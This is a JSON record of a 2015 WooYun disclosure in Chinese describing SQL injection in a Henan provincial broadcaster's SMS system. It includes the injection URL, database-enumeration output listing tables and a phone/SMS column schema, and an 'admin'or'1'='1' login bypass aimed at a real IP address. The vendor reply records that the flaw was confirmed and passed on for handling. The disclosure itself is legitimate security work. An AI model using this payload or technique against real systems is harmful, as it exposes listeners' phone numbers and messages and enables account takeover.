{"id": 448, "wybug_id": "wooyun-2015-0125787", "wybug_title": "河南广电sa权限注入(河南所有电台短信+改所有电台主持密码+参与互动用户信息)", "wybug_corp": "河南广电", "wybug_author": "路人甲", "wybug_date": "2015-07-10 10:49", "wybug_open_date": "2015-08-28 16:06", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-28：\t细节向公众公开  简要描述： 河南广电sa权限注入(可查看所有电台短信记录+修改所有电台主持人密码) 详细说明：  注入点：\n\nmask 区域\n1.http://**.**.**/(S(bnpy3yb5u0vxv024i2zr0nze))/ShowAffiche.aspxId=16\n\n\n\n\ndatabase management system users privileges:[*] BUILTIN\\\\Administrators[*] sa[*] sms\n\n\n\navailable databases [10]:[*] CePing[*] MasSMS[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] SMS1[*] SMSInfo[*] tempdb\n\ncurrent database:    'SMSInfo'\n泡一下当前库！\nDatabase: SMSInfo[74 tables]+------------------------------+| dbo.ActManage                || dbo.AfficheInfo              || dbo.BY_UserInfo              || dbo.BlackListInfo            || dbo.CNGP_Receive             || dbo.CNGP_Send                || dbo.CNGP_Send_H              || dbo.DictInfo                 || dbo.EventInfo                || dbo.Keyword_Sms              || dbo.LYBY_UserInfo            || dbo.LY_UserInfo              || dbo.Lottery_His              || dbo.Lottery_Info             || dbo.OperInfo                 || dbo.OperPurviewInfo          || dbo.OperSysPermission        || dbo.PhonePostionInfo         || dbo.PhoneType_dic            || dbo.ReceiveInfo_bak77711_16  || dbo.ReceiveInfo_bak77713     || dbo.ReceiveInfo_bak77713_16  || dbo.ReceiveInfo_bak77713_19  || dbo.SGIP_Receive             || dbo.SJGB_UserInfo            || dbo.SJGB_UserInfo_bak        || dbo.SMS_Receive              || dbo.SMS_Send                 || dbo.SMS_Send_H               || dbo.Sms_Content              || dbo.UserInfo                 || dbo.UserReceiveInfo          || dbo.UserReceiveInfo_0819     || dbo.UserReceiveInfo_1120     || dbo.UserReceiveInfo_1124     || dbo.UserReceiveInfo_20121120 || dbo.UserReceiveInfo_777      || dbo.UserTmp1                 || dbo.WXTBY_UserInfo           || dbo.WzActInfo                || dbo.WzInfo                   || dbo.WzSearchUserInfo         || dbo.YB_UserInfo              || dbo.ceshi                    || dbo.cpsp_106262965_56        || dbo.cpsp_receive             || dbo.cpsp_send                || dbo.cpsp_send_bak            || dbo.cpsp_send_h              || dbo.dtproperties             || dbo.pysp                     || dbo.pysp_h                   || dbo.sgip_106262965_56        || dbo.sgip_send                || dbo.sgip_send_h              || dbo.sjtgb_menu               || dbo.sjtgb_user               || dbo.sms_106262965_56         || dbo.sms_provision            || dbo.sms_time                 || dbo.svctype_sgip             || dbo.sysconstraints           || dbo.syssegments              || dbo.test                     || dbo.tmp_1                    || dbo.tmp_2                    || dbo.tmp_3                    || dbo.tmp_phone                || dbo.tmp_phone11              || dbo.userReceiveInfo_0414     || dbo.userReceiveInfo_Temp     || dbo.wmpx                     || dbo.wzcx_user                || dbo.zypx                     |+------------------------------+\n\nDatabase: SMSInfoTable: dbo.UserReceiveInfo[9 columns]+------------+----------+| Column     | Type     |+------------+----------+| ActId      | int      || CreateTime | datetime || Id         | int      || IsLooked   | int      || Phone      | varchar  || Port       | varchar  || SMSContent | varchar  || Status     | int      || type       | int      |+------------+----------+\n\n\n可以看到有19万多的手机号。好了，就到这里吧。不跑数据了！时间。   漏洞证明：  后台\nhttp://219.156.123.188:8080/(S(bnpy3yb5u0vxv024i2zr0nze))/Login.aspx\n账号admin'or'1'='1密码随便\n\n所有河南电台\n\n\n\n\n\n\n\n修改主持人密码\n\n随便点击一个电台，就河南综合电台\n\n\n\n可以看到所有听众的短信！   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-07-14 16:04 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发给河南分中心，由河南分中心后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-10 10:52 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:84        | [code]心若没有栖息的地方，走到哪里都是在...)\t\t \n  前排    \n     2015-08-29 09:52 |    \t\tRainism \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:3        | hacking for fun)\t\t \n  漂亮    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}